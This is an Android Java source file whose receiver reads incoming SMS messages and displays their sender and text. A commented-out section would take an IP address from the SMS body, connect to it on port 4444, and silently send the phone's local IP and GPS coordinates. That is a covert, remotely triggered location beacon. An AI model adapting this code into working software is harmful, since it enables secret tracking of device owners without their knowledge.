package com.replica;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class Pong extends BroadcastReceiver {
	
	public void onReceive(Context context, Intent intent) {
		//---get the SMS message passed in---
        Bundle bundle = intent.getExtras();        
        SmsMessage[] msgs = null;
        String ipAddressStr = "";
        String displaystr = "";            
        if (bundle != null)
        {
            //---retrieve the SMS message received---
            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length];            
            for (int i=0; i<msgs.length; i++){
                msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                ipAddressStr = msgs[i].getMessageBody().toString();
                displaystr += "SMS from " + msgs[i].getOriginatingAddress();                     
                displaystr += " :";
                displaystr += ipAddressStr;
                displaystr += "\n";        
            }
            //---display the new SMS message---
            Toast.makeText(context, displaystr, Toast.LENGTH_SHORT).show();
        }
        //sendMessage(ipAddressStr);
	}
	
	/*public void sendMessage (String ipAddress) {
		try {
	       	InetAddress serverAddr = InetAddress.getByName(ipAddress);
	       	Socket socket = new Socket(serverAddr, 4444);
	       	GPSTest gpstest = new GPSTest(); 
	       	String message = getLocalIpAddress() + Double.toString(gpstest.returnLocation().getLatitude()) + Double.toString(gpstest.returnLocation().getLongitude());
	       		try {
			    	 PrintWriter out = new PrintWriter( new BufferedWriter( new OutputStreamWriter(socket.getOutputStream())),true);
			    	 out.println(message);			    	 
	            } catch(Exception e) {
			      } finally {
			        socket.close();
			      }
	    } catch (Exception e) {}
	}
	
	public String getLocalIpAddress() throws SocketException {
	    for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
	        NetworkInterface intf = en.nextElement();
	        for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
	        	InetAddress inetAddress = enumIpAddr.nextElement();
	            if (!inetAddress.isLoopbackAddress()) {
	            	return inetAddress.getHostAddress().toString();
	            }
	        }
	    }
	    return null;
	}*/
}
